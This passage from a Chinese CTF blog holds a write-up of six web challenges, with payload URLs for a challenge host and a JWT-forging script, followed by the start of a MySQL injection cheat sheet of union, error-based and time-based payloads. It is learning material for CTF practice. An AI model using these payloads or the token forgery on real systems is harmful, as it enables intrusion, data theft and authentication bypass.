class="line"><span class="keyword">echo</span> intval(<span class="string">'042'</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">1e10</span>);                    <span class="comment">// 1410065408</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'1e10'</span>);                  <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">0x1A</span>);                    <span class="comment">// 26</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42000000</span>);                <span class="comment">// 42000000</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">420000000000000000000</span>);   <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'420000000000000000000'</span>); <span class="comment">// 32位系统：2147483647 64位系统：9223372036854775807</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>, <span class="number">8</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'42'</span>, <span class="number">8</span>);                 <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>());                 <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>(<span class="string">'foo'</span>, <span class="string">'bar'</span>));     <span class="comment">// 1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>PHP intval() 整型转换函数——返回值：<br> 成功时返回 var 的 integer 值，<br> 失败时返回 0。<br> 空的 array 返回 0，<br>  非空的 array 返回 1。</p></blockquote><p>一开始惊奇的发现可以使用不为空的数组，因为返回的是 1 ，但是不为空的数组似乎并不能和整型的 1 相加， 绕不过第二个条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (intval($password) &lt; <span class="number">2333</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'successful !'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// successful !</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>but…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (intval($password + <span class="number">1</span>) &gt; <span class="number">2333</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'successful !'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'false !'</span>;</span><br><span class="line"><span class="comment">//false!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>转换思路…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (intval($password) &lt; <span class="number">2333</span> &amp;&amp; intval($password + <span class="number">1</span>) &gt; <span class="number">2333</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'successful !'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'false !'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//传入password=0x91d，successful !</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后构造最终 payload为<br><a href="http://39.100.83.188:8001/?value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=329&amp;value[12]=339&amp;value[13]=323&amp;value[14]=323&amp;value[15]=306&amp;value[16]=304&amp;value[17]=305&amp;value[18]=313&amp;password=0x91d" target="_blank" rel="noopener">http://39.100.83.188:8001/?value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=329&amp;value[12]=339&amp;value[13]=323&amp;value[14]=323&amp;value[15]=306&amp;value[16]=304&amp;value[17]=305&amp;value[18]=313&amp;password=0x91d</a></p><p><br><br></p><h1 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h1><p>破解3位数字密码</p><p>用户名：admin;密码： 三位数;验证码：xxx</p><p>那么密码我们可以用 burpsuite 来暴力破解</p><p>需要下功夫的就是验证码这一块</p><p>看见一篇不错的文章,直接提供了思路： <a href="http://foreversong.cn/archives/889" target="_blank" rel="noopener">http://foreversong.cn/archives/889</a></p><p>经过尝试发现验证码是刷新的，且不可从前端获取到</p><p>尝试设置验证码为空，且删除Cookie</p><p><img src="/.com//1.png" alt></p><p>然后attack</p><p><img src="/.com//2.png" alt></p><p><br><br></p><h1 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h1><p>一道sql-labs二次注入的题</p><p>直接注册：admin’or 1#</p><p>进入界面后，修改admin的密码</p><p>登录admin获取flag</p><p><br><br></p><h1 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h1><p><strong>分析源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); <span class="comment">//关闭错误报告</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);    <span class="comment">//包含了flag文件</span></span><br><span class="line">$hashed_key = <span class="string">'ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a'</span>;   <span class="comment">//赋值</span></span><br><span class="line">$parsed = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);   <span class="comment">//请求到的url，经过URL解析函数，返回其组成部分，对其赋值</span></span><br><span class="line"><span class="comment">//query - 在问号 ? 之后</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($parsed[<span class="string">"query"</span>]))&#123;    <span class="comment">//判断是否设置</span></span><br><span class="line">    $query = $parsed[<span class="string">"query"</span>];  <span class="comment">//赋值</span></span><br><span class="line">    $parsed_query = parse_str($query);  <span class="comment">//把查询字符串解析到变量中</span></span><br><span class="line">    <span class="keyword">if</span>($parsed_query!=<span class="keyword">NULL</span>)&#123;    <span class="comment">//不为空的话</span></span><br><span class="line">        $action = $parsed_query[<span class="string">'action'</span>]; <span class="comment">//里面的action对其赋值</span></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($action===<span class="string">"auth"</span>)&#123;   <span class="comment">//判断</span></span><br><span class="line">        $key = $_GET[<span class="string">"key"</span>];    <span class="comment">//GET传参 </span></span><br><span class="line">        $hashed_input = hash(<span class="string">'sha256'</span>, $key); </span><br><span class="line">        <span class="keyword">if</span>($hashed_input!==$hashed_key)&#123;    <span class="comment">//这里要判断两值是否相等</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&lt;img src='cxk.jpg'&gt;"</span>); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $flag; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>题目很浅显易懂，首先过 <code>if($action===&quot;auth&quot;)</code>的判断条件，直接用 GET 传参就OK了</p><p>但是输出flag的关键点是 <code>if($hashed_input!==$hashed_key)</code> </p><p>跟进一下发现 <code>$hashed_key</code> 在第四行已经赋值</p><p><code>$hashed_input</code> 是通过 GET 传入的参数 key 进过hash计算得到的</p><p>发现直接将其解码肯定解码不出来（貌似是单向加密</p><p>寻找可以利用的点，发现了一个 <code>parse_str()</code> 函数</p><p><strong>Parse_str()函数引起的变量覆盖漏洞</strong></p><blockquote><p>parse_str() 函数用于把查询字符串解析到变量中<br>如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。<br>极度不建议 在没有 array参数的情况下使用此函数<br>并且在 PHP 7.2 中将废弃不设置参数的行为。此函数没有返回值</p></blockquote><p>利用变量覆盖，将其 <code>$hashed_key</code> 的值给覆盖掉</p><p>构造payload：<code>http://39.100.83.188:8066/?action=auth&amp;key=1&amp;hashed_key=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b</code> </p><p><br><br></p><h1 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h1><p>题目确实脑洞：放的tips：看来你并不是Union.373组织成员，请勿入内！</p><p>开始改了Referer，XFF头均无果</p><p>正解：改 user—agent 头，直接在后添加即可</p><p>注入，过滤了圆括号，注释符，from等等</p><p>payload ：order by 排序盲注</p><p>（直接放上官方payload</p><p><img src="/.com//3.png" alt></p><p><br><br></p><h1 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h1><p>常规注册账号，在burpsuite里查看了返回值</p><blockquote><p>JWT<br>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC<br>7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p></blockquote><ul><li>JWT相关资料<ul><li><a href="https://www.jianshu.com/p/576dbf44b2ae" target="_blank" rel="noopener">https://www.jianshu.com/p/576dbf44b2ae</a></li></ul></li></ul><p>注册了账号之后查看返回值</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"result"</span>:<span class="literal">true</span>,<span class="attr">"token"</span>:<span class="string">"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMTIzMzIxMTIiLCJwcml2Ijoib3RoZXIifQ.ppGykY-_rtqX7IbhpIxFiozoBKtDsjbENeidcv3rdQ9WTGTua9gcDJ5O89xuoaS2JD5kz5VfvXU67ZU37x5xNAzCVNgwP3p82oR7KJZFfi_7kdnUMrRAq0JEu2oB0Lmj3Sz8HBe7ToOcnR-NzQo1ds8qrQrT7OhYjFKQXfLuXyU"</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Header</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"alg"</span>: <span class="string">"RS256"</span>,</span><br><span class="line">  <span class="attr">"typ"</span>: <span class="string">"JWT"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Payload</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"12332112"</span>,</span><br><span class="line">  <span class="attr">"priv"</span>: <span class="string">"other"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Signature</span><br></pre></td></tr></table></figure><p>/static/js/common.js 中有一个这个函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getpubkey</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    get the pubkey for test</span></span><br><span class="line"><span class="comment">    /pubkey/&#123;md5(username+password)&#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿到pubkey</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;pubkey&quot;:&quot;-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\nIC+LX+9V/mpyKe9R3wIDAQAB\n-----END PUBLIC KEY-----&quot;,&quot;result&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>使用脚本将加密算法置空或者改为HS256（对称加密），把上面的公钥放在1.txt文件里</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">public = open(<span class="string">'1.txt'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">print(jwt.encode(&#123;<span class="string">"name"</span>: <span class="string">"12332112"</span>,<span class="string">"priv"</span>: <span class="string">"admin"</span>&#125;, key=public, algorithm=<span class="string">'HS256'</span>))</span><br></pre></td></tr></table></figure><p>后得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMTIzMzIxMTIiLCJwcml2IjoiYWRtaW4ifQ.IulW498rWKk9cs38oRe3c7hBrF130CwzDbe346yldzQ</span><br></pre></td></tr></table></figure><p>在list界面带上这个访问<br><img src="/.com//4.png" alt></p><p>最后在生成paste的界面<br>访问 <a href="http://39.100.83.188:8053/text/admin:22f1e0aa7a31422ad63480aa27711277" target="_blank" rel="noopener">http://39.100.83.188:8053/text/admin:22f1e0aa7a31422ad63480aa27711277</a><br>得到flag…</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入一把梭</title>
      <link href="/2019/06/07/SQL%E6%B3%A8%E5%85%A5%E4%B8%80%E6%8A%8A%E6%A2%AD/"/>
      <url>/2019/06/07/SQL%E6%B3%A8%E5%85%A5%E4%B8%80%E6%8A%8A%E6%A2%AD/</url>
      
        <content type="html"><![CDATA[<p>SQL注入手册…</p><a id="more"></a><h1 id="Mysql一把梭"><a href="#Mysql一把梭" class="headerlink" title="Mysql一把梭"></a>Mysql一把梭</h1><h2 id="常用命令一把梭"><a href="#常用命令一把梭" class="headerlink" title="常用命令一把梭"></a>常用命令一把梭</h2><p><strong>一些基本信息</strong></p><blockquote><p>MySQL版本 <code>version()</code></p></blockquote><blockquote><p>当前用户名  <code>user()</code></p></blockquote><blockquote><p>数据库名 <code>database()</code></p></blockquote><blockquote><p>数据库路径 <code>@@datadir</code></p></blockquote><blockquote><p>操作系统版本 <code>@@version_compile_os</code></p></blockquote><blockquote><p>安装 MySQL 的安装路径  <code>@@basedir</code></p></blockquote><br><h2 id="UNION注入一把梭"><a href="#UNION注入一把梭" class="headerlink" title="UNION注入一把梭"></a>UNION注入一把梭</h2><h3 id="UNION注入"><a href="#UNION注入" class="headerlink" title="UNION注入"></a>UNION注入</h3><blockquote><p>注意：Mysql要大于5.0</p></blockquote><p>找到注入点后获取字段数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by num</span><br></pre></td></tr></table></figure><p>查看哪些地方有字段的回显</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2.</span>..,n</span><br></pre></td></tr></table></figure><p>获取系统数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,schema_name <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure><p>直接获取当前数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,...,<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure><p>获取数据库中的表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,...,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure><p>获取表中的字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,...,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> tadble_name=<span class="string">'&lt;你取得的表名&gt;'</span></span><br></pre></td></tr></table></figure><p>获取各个字段值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,<span class="keyword">group_concat</span>(&lt;获取到的字段<span class="number">1</span>&gt;,&lt;获取到的字段<span class="number">2</span>&gt;) <span class="keyword">from</span> &lt;当前表名&gt;</span><br></pre></td></tr></table></figure><br><h3 id="UNION-JOIN-注入"><a href="#UNION-JOIN-注入" class="headerlink" title="UNION + JOIN 注入"></a>UNION + JOIN 注入</h3><blockquote><p>适用于：逗号被过滤</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span>)a <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">1</span>)b <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="keyword">database</span>())c;</span><br></pre></td></tr></table></figure><br><h2 id="报错注入一把梭"><a href="#报错注入一把梭" class="headerlink" title="报错注入一把梭"></a>报错注入一把梭</h2><blockquote><p>若有报错信息则选择报错注入</p></blockquote><p><strong>UpdateXml(有长度限制,最长32位)</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and updatexml(1,concat(0x7e,(<span class="keyword">SELECT</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><blockquote><p>如果concat被过滤了，可以使用MAKE_SET函数</p></blockquote><br><p><strong>ExtractValue(有长度限制,最长32位)</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and extractvalue(1, concat(0x7e, (<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><blockquote><p>如果concat被过滤了，可以使用MAKE_SET函数</p></blockquote><br><p><strong>exp(5.5.5以上)</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">普通查询</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x));</span><br><span class="line"></span><br><span class="line">得到表名：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)x));</span><br><span class="line"></span><br><span class="line">得到列名：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)x));</span><br><span class="line"></span><br><span class="line">检索数据：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(~ (<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">concat_ws</span>(<span class="string">':'</span>,<span class="keyword">id</span>, username, <span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)x));</span><br></pre></td></tr></table></figure><blockquote><p>mysql&gt;5.5.53时，则不能返回查询结果</p></blockquote><br><p><strong>floor(需要三个函数支持)</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br></pre></td></tr></table></figure><blockquote><p>count(*)、rand()、group by三者缺一不可</p></blockquote><p><a href="https://www.jianshu.com/p/8c2343705100" target="_blank" rel="noopener">floor完整的注入流程</a></p><br><p><strong>其余报错</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">GeometryCollection()</span><br><span class="line"></span><br><span class="line">id = 1 AND GeometryCollection((<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">polygon()</span><br><span class="line"></span><br><span class="line"><span class="keyword">id</span> =<span class="number">1</span> <span class="keyword">AND</span> polygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">multipoint()</span><br><span class="line"></span><br><span class="line"><span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">AND</span> multipoint((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">multilinestring()</span><br><span class="line"></span><br><span class="line"><span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">AND</span> multilinestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">linestring()</span><br><span class="line"></span><br><span class="line"><span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">AND</span> LINESTRING((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">multipolygon()</span><br><span class="line"></span><br><span class="line"><span class="keyword">id</span> =<span class="number">1</span> <span class="keyword">AND</span> multipolygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><blockquote><p>都不怎么好用</p></blockquote><br><h2 id="时间，布尔盲注一把梭"><a href="#时间，布尔盲注一把梭" class="headerlink" title="时间，布尔盲注一把梭"></a>时间，布尔盲注一把梭</h2><h3 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h3><p><strong>sleep</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</span><br></pre></td></tr></table></figure><blockquote><p>if判断语句，条件为假，执行sleep</p></blockquote><br><p><strong>BENCHMARK</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(count,expr)</span><br></pre></td></tr></table></figure><blockquote><p>在运行过程中占用大量的cpu资源</p></blockquote><br><p><strong>笛卡尔积</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and if(ascii(substr((<span class="keyword">select</span> <span class="keyword">database</span>()),%d,<span class="number">1</span>))&lt;%d,(<span class="keyword">SELECT</span> <span class="keyword">count</span>(*) <span class="keyword">FROM</span> information_schema.columns A, information_schema.columns B,information_schema.tables C),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure><blockquote><p>查询数据量极大的表造成延时。</p></blockquote><br><p><strong>不正确正则</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">if</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="number">1</span>)=<span class="string">'1'</span>,<span class="number">1</span>,<span class="number">1</span>),<span class="keyword">concat</span>(rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>)) <span class="keyword">RLIKE</span> <span class="string">'(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><br><h3 id="布尔"><a href="#布尔" class="headerlink" 